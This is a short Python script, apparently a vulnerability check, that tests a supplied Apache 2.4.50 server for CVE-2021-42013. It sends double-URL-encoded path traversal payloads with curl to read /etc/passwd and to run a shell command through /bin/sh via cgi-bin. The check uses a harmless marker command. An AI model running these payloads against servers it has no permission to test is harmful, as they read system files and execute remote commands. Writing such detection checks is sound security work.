from subprocess import getoutput
import sys

# Apache 2.4.50 path traversal and remote code execution if mod_cgi is enabled, this is the same as CVE-2021-41773 except we use double url encoding

def main():
    payloads = [
        ("root:", f"\"{sys.argv[1]}/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd\""),
        ("root:", f"\"{sys.argv[1]}/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd\""),
        ("CVE-2021-42013", f"-d 'echo Content-Type: text/plain; echo; echo 31024-1202-EVC | rev' \"{sys.argv[1]}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh\""),
    ]

    for (match, payload) in payloads:
        if match in getoutput(f"curl -s --path-as-is {payload}"):
            exit(0)

    exit(1)

if __name__ == "__main__":
    main()

